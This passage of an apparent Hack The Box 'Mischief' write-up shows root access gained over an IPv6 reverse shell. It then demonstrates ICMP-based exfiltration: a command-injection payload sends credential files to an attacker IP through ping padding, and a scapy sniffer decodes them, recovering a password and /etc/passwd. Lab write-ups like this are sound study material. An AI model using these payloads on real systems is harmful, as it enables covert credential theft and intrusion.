+su: must be run from a terminal
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@Mischief:/var/www/html$ ^Z
+[1]+  Stopped                 nc -6 -lnvp 9001
+==================================================================================================================================
+
+We now need a proper working terminal and then we can try switching to the root user.
+Commands and Output:
+==================================================================================================================================
+www-data@Mischief:/var/www/html$ export TERM=xterm
+www-data@Mischief:/var/www/html$ 
+www-data@Mischief:/var/www/html$ su - root
+Password: 
+root@Mischief:~# id
+uid=0(root) gid=0(root) groups=0(root)
+==================================================================================================================================
+
+We try catting the root.txt however we get told that is not there so looks like a scavanger hunt.
+Commands and Output:
+==================================================================================================================================
+root@Mischief:~# cat root.txt 
+The flag is not here, get a shell to find it!
+root@Mischief:~# ls
+root.txt
+root@Mischief:~# ls -la
+total 68
+drwx------  6 root root  4096 May 28  2018 .
+drwxr-xr-x 22 root root  4096 Jul 14  2018 ..
+-rw-------  1 root root  2862 Jul 14  2018 .bash_history
+-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
+drwx------  2 root root  4096 May 15  2018 .cache
+drwx------  3 root root  4096 May 15  2018 .gnupg
+drwxr-xr-x  3 root root  4096 May 14  2018 .local
+-rw-------  1 root root   330 May 14  2018 .mysql_history
+-rw-r--r--  1 root root   148 Aug 17  2015 .profile
+-r--------  1 root root    46 May 17  2018 root.txt
+-rw-r--r--  1 root root    66 May 15  2018 .selected_editor
+drwx------  2 root root  4096 May 14  2018 .ssh
+-rw-------  1 root root 12472 May 28  2018 .viminfo
+-rw-r--r--  1 root root   209 May 14  2018 .wget-hsts
+==================================================================================================================================
+
+We look at the dates from which root.txt was made and based off of that we can try and find the root.txt file.
+We could also try looking for all files that 33 bytes in length to find it.
+Commands and Output:
+==================================================================================================================================
+root@Mischief:~# find / -newermt 2018-05-15 ! -newermt 2018-05-18 -type f -ls 2>/dev/null 
+   277469      4 -r--------   1 root     root           33 May 17  2018 /usr/lib/gcc/x86_64-linux-gnu/7/root.txt
+   662102      4 -r--------   1 loki     loki           33 May 17  2018 /home/loki/user.txt
+   662100      4 -rw-rw-r--   1 loki     loki           28 May 17  2018 /home/loki/credentials
+   661741      4 -rwxrwxr-x   1 loki     loki           86 May 15  2018 /home/loki/hosted/webstart.sh
+   923486      4 -rw-r--r--   1 root     root           66 May 15  2018 /root/.selected_editor
+   923487      4 -r--------   1 root     root           46 May 17  2018 /root/root.txt
+   923483      0 -rw-r--r--   1 root     root            0 May 15  2018 /root/.cache/motd.legal-displayed
+   661740      4 -rw-r--r--   1 root     root          341 May 15  2018 /etc/apache2/ports.conf
+   661738      4 -rw-r--r--   1 root     root         1782 May 15  2018 /etc/apache2/envvars
+   787736      4 -rw-r--r--   1 root     root         1286 May 15  2018 /etc/apache2/sites-available/000-default.conf
+   276577     72 -rw-------   1 root     root        70466 May 15  2018 /etc/apparmor.d/cache/snap.core.4571.usr.lib.snapd.snap-confine
+   276589      4 -rw-r-----   1 root     shadow       1084 May 15  2018 /etc/shadow
+
+..
+..
+..
+
+root@Mischief:~# cat /usr/lib/gcc/x86_64-linux-gnu/7/root.txt
+ae155..................
+==================================================================================================================================
+
+We get the root.txt this way or simply finding the file by exact size
+Commands and Output:
+==================================================================================================================================
+root@Mischief:~# find / -type f -size 33c 2>/dev/null
+/usr/lib/tmpfiles.d/man-db.conf
+/usr/lib/gcc/x86_64-linux-gnu/7/root.txt
+/usr/lib/grub/i386-pc/video.lst
+/usr/share/doc/eject/AUTHORS
+/usr/share/lintian/overrides/e2fsprogs
+/usr/include/x86_64-linux-gnu/asm/termios.h
+/usr/include/x86_64-linux-gnu/asm/sockios.h
+/usr/src/linux-headers-4.15.0-20/scripts/genksyms/.gitignore
+/usr/src/linux-headers-4.15.0-20/drivers/video/fbdev/mmp/fb/Makefile
+/usr/src/linux-headers-4.15.0-20/arch/alpha/include/asm/local64.h
+/usr/src/linux-headers-4.15.0-20/arch/x86/platform/ts5500/Makefile
+/usr/src/linux-headers-4.15.0-20/arch/x86/include/asm/local64.h
+/usr/src/linux-headers-4.15.0-20/arch/x86/include/uapi/asm/termios.h
+/usr/src/linux-headers-4.15.0-20/arch/x86/include/uapi/asm/sockios.h
+/usr/src/linux-headers-4.15.0-20/arch/ia64/include/asm/local64.h
+/usr/src/linux-headers-4.15.0-20/arch/mn10300/include/asm/local64.h
+/usr/src/linux-headers-4.15.0-20/arch/score/include/asm/local64.h
+/usr/src/linux-headers-4.15.0-20/arch/m32r/include/asm/local64.h
+/usr/src/linux-headers-4.15.0-20/arch/frv/include/asm/local64.h
+/home/loki/user.txt
+/root/.local/share/nano/search_history
+/boot/grub/i386-pc/video.lst
+/etc/machine-id
+/var/lib/dpkg/info/networkd-dispatcher.conffiles
+/var/lib/dpkg/info/tcpdump.conffiles
+/var/lib/dpkg/info/install-info.triggers
+/var/lib/dpkg/info/libcurl3-gnutls:amd64.shlibs
+/var/lib/dpkg/info/libgdbm-compat4:amd64.shlibs
+/var/lib/dpkg/info/libkrb5support0:amd64.shlibs
+==================================================================================================================================
+
+The hint for getting flag let's us know that we did the box in an unintended way. The creator of the box forgot to apply ipv6 rules
+to the box. If we look at the iptables for ipv4 
+Commands and Output:
+==================================================================================================================================
+root@Mischief:~# iptables -L
+Chain INPUT (policy ACCEPT)
+target     prot opt source               destination         
+ACCEPT     udp  --  anywhere             anywhere             udp spt:snmp
+ACCEPT     udp  --  anywhere             anywhere             udp dpt:snmp
+DROP       udp  --  anywhere             anywhere            
+ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
+ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:3366
+DROP       tcp  --  anywhere             anywhere            
+
+Chain FORWARD (policy ACCEPT)
+target     prot opt source               destination         
+
+Chain OUTPUT (policy ACCEPT)
+target     prot opt source               destination         
+ACCEPT     udp  --  anywhere             anywhere             udp dpt:snmp
+ACCEPT     udp  --  anywhere             anywhere             udp spt:snmp
+DROP       udp  --  anywhere             anywhere            
+ACCEPT     tcp  --  anywhere             anywhere             tcp spt:ssh
+ACCEPT     tcp  --  anywhere             anywhere             tcp spt:3366
+DROP       tcp  --  anywhere             anywhere            
+==================================================================================================================================
+
+Meanwhile ipv6 tables are wide open.
+Commands and Output:
+==================================================================================================================================
+root@Mischief:~# ip6tables -L
+Chain INPUT (policy ACCEPT)
+target     prot opt source               destination         
+
+Chain FORWARD (policy ACCEPT)
+target     prot opt source               destination         
+
+Chain OUTPUT (policy ACCEPT)
+target     prot opt source               destination         
+==================================================================================================================================
+
+One way to abuse ipv6, that's why the reverse shell. Th intended way is much harder since it involves doing everything within icmp.
+
+How to read a file through icmp. We look at man ping 
+Commands and Output:
+==================================================================================================================================
+     -p pattern
+           You may specify up to 16 “pad” bytes to fill out the packet you send. This is useful for diagnosing data-dependent problems
+           in a network. For example, -p ff will cause the sent packet to be filled with all ones.
+
+==================================================================================================================================
+
+This allows us to write stuff into an icmp packet and up to 16 bytes at a time.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/mischief]
+└──╼ $ping -c 1 -p deadbeefdeadbeef 127.0.0.1
+PATTERN: 0xdeadbeefdeadbeef
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.071 ms
+
+--- 127.0.0.1 ping statistics ---
+==================================================================================================================================
+
+If we look at wireshark, we see the pad.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/mischief]
+└──╼ $vim exfil
+┌─[user@parrot-virtual]─[~/htb/mischief]
+└──╼ $xxd -p -c 16 exfil 
+506c6561736520737562736372696265
+20746f206d65210a
+==================================================================================================================================
+
+
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/mischief]
+└──╼ $cat exfil 
+Please subscribe to me!
+┌─[user@parrot-virtual]─[~/htb/mischief]
+└──╼ $xxd -p -c 16 exfil | while read line; do echo $line; done
+506c6561736520737562736372696265
+20746f206d65210a
+
+..
+..
+..
+
+┌─[user@parrot-virtual]─[~/htb/mischief]
+└──╼ $xxd -p -c 16 exfil | while read line; do ping -c 1 -p $line 127.0.0.1; done
+PATTERN: 0x506c6561736520737562736372696265
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.034 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.034/0.034/0.034/0.000 ms
+PATTERN: 0x20746f206d65210a
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.017 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms   
+==================================================================================================================================
+
+So what we could have done the intended way if ipv6 and the ";" workaround were acting accordingly is something like this on burp
+Commands and Output:
+==================================================================================================================================
+command=xxd -p -c 16 /home/loki/cred* | while read line; do ping -c 1 -p $line 10.10.14.18; done
+==================================================================================================================================
+
+
+Commands and Output:
+==================================================================================================================================
+POST / HTTP/1.1
+Host: [dead:beef::250:56ff:feb9:6538]
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://[dead:beef::250:56ff:feb9:6538]/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+Origin: http://[dead:beef::250:56ff:feb9:6538]
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=le3gsmjmklml7p642s9c92thb7
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Cache-Control: max-age=0
+
+command=xxd+-p+-c+16+/home/loki/cred*+|+while+read+line%3b+do+ping+-c+1+-p+$line+10.10.14.18%3b+done
+==================================================================================================================================
+
+If we look at the wireshark output we would see the icmp data and the file being outputed in each ping response.
+Commands and Output:
+==================================================================================================================================
+ETM
+@
+
+
+
+
+\i&Jkh£`'pass: lokiisthebpass: lokiisthebpass: lo
+
+ETM$@
+
+
+
+
+\ý!Jlh£`5orsegod
+estnorsegod
+estnorsegod
+estnorse
+==================================================================================================================================
+
+It's pretty ugly doing it through wireshark so we instead do it via a python script.
+We first capture the output with tcpdump.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/mischief]
+└──╼ $sudo tcpdump -i tun0 -w file.out icmp
+[sudo] password for user: 
+tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+^C4 packets captured
+4 packets received by filter
+0 packets dropped by kernel
+
+==================================================================================================================================
+
+We will use scapy to print the packets saved in file.out
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/mischief]
+└──╼ $python3 
+Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
+[GCC 10.2.1 20210110] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> from scapy.all import *
+>>> rdpcap('file.out')
+<file.out: TCP:0 UDP:0 ICMP:4 Other:0>
+>>> pkts = rdpcap('file.out')
+>>> pkts
+<file.out: TCP:0 UDP:0 ICMP:4 Other:0>
+>>> for pkt in pkts:
+...     print(pkt)
+... 
+b'E\x00\x00Tb(@\x00?\x01\xac\xff\n\n\n\\\n\n\x0e\x12\x08\x00\xbe\x84Ju\x00\x01\x19j\xa3`\x00\x00\x00\x00+\xbd\n\x00\x00\x00\x00\x00pass: lokiisthebpass: lokiisthebpass: lo'
+b'E\x00\x00T\xa5n\x00\x00@\x01\xa8\xb9\n\n\x0e\x12\n\n\n\\\x00\x00\xc6\x84Ju\x00\x01\x19j\xa3`\x00\x00\x00\x00+\xbd\n\x00\x00\x00\x00\x00pass: lokiisthebpass: lokiisthebpass: lo'
+b'E\x00\x00Tb*@\x00?\x01\xac\xfd\n\n\n\\\n\n\x0e\x12\x08\x00\xbb\x1dJv\x00\x01\x19j\xa3`\x00\x00\x00\x00\xae-\x0c\x00\x00\x00\x00\x00orsegod\nestnorsegod\nestnorsegod\nestnorse'
+b'E\x00\x00T\xa5\x83\x00\x00@\x01\xa8\xa4\n\n\x0e\x12\n\n\n\\\x00\x00\xc3\x1dJv\x00\x01\x19j\xa3`\x00\x00\x00\x00\xae-\x0c\x00\x00\x00\x00\x00orsegod\nestnorsegod\nestnorsegod\nestnorse'
+==================================================================================================================================
+
+We can now print it in more readable way. By doing encapulation of the icmp layer only
+Commands and Output:
+==================================================================================================================================
+>>> pkts[0][ICMP]
+<ICMP  type=echo-request code=0 chksum=0xbe84 id=0x4a75 seq=0x1 |<Raw  load='\x19j\xa3`\x00\x00\x00\x00+\xbd\n\x00\x00\x00\x00\x00pass: lokiisthebpass: lokiisthebpass: lo' |>>
+>>> ls(pkts[0][ICMP])
+type       : ByteEnumField                       = 8               (8)
+code       : MultiEnumField (Depends on type)    = 0               (0)
+chksum     : XShortField                         = 48772           (None)
+id         : XShortField (Cond)                  = 19061           (0)
+seq        : XShortField (Cond)                  = 1               (0)
+ts_ori     : ICMPTimeStampField (Cond)           = None            (26175379)
+ts_rx      : ICMPTimeStampField (Cond)           = None            (26175379)
+ts_tx      : ICMPTimeStampField (Cond)           = None            (26175379)
+gw         : IPField (Cond)                      = None            ('0.0.0.0')
+ptr        : ByteField (Cond)                    = None            (0)
+reserved   : ByteField (Cond)                    = None            (0)
+length     : ByteField (Cond)                    = None            (0)
+addr_mask  : IPField (Cond)                      = None            ('0.0.0.0')
+nexthopmtu : ShortField (Cond)                   = None            (0)
+unused     : ShortField (Cond)                   = None            (0)
+unused     : IntField (Cond)                     = None            (0)
+--
+load       : StrField                            = b'\x19j\xa3`\x00\x00\x00\x00+\xbd\n\x00\x00\x00\x00\x00pass: lokiisthebpass: lokiisthebpass: lo' (b'')
+==================================================================================================================================
+
+There is some uneveness with the packets so we can try and capture 2 at a time.
+Commands and Output:
+==================================================================================================================================
+command=xxd -p -c 4 /home/loki/cred* | while read line; do ping -c 1 -p $line 10.10.14.18; done
+==================================================================================================================================
+
+
+Commands and Output:
+==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/mischief]
+└──╼ $sudo !!
+sudo tcpdump -i tun0 -w icmp.out icmp
+[sudo] password for user: 
+tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+^C14 packets captured
+14 packets received by filter
+0 packets dropped by kernel
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+>>> pkts = rdpcap('icmp.out')
+>>> pkts[0][ICMP].load[-4:]     
+b'pass'
+==================================================================================================================================
+
+Now that we have a gist of how to get output from scapy we can create a script to sniff out the packets and output them as clean 
+text.
+Commands and Output:
+==================================================================================================================================
+from scapy.all import *
+
+def process_packet(pkt):
+    if pkt.haslayer(ICMP):
+        if pkt[ICMP].type ==8:
+            data= pkt[ICMP].load[-4:]
+            print(f'{data.decode("utf-8")}', flush=True, end='')
+
+sniff(iface="tun0", prn=process_packet)
+
+==================================================================================================================================
+
+We make sure to run the command on burp and sniff while it goes.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/mischief]
+└──╼ $sudo python3 read-icmp.py
+pass: lokiisthebestnorsegod
+==================================================================================================================================
+
+We can even sniff bigger files such as /etc/passwd.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/mischief]
+└──╼ $sudo python3 read-icmp.py
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+loki:x:1000:1004:loki:/home/loki:/bin/bash
+Debian-snmp:x:111:113::/var/lib/snmp:/bin/false
+mysql:x:112:115:MySQL Server,,,:/nonexistent:/bin/fale
+==================================================================================================================================
+
+The hard part is creating an icmp shell, since if we tried to pipe the su command in to read the file and input the password and
+create an expect script it would be a pain to find the file.
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
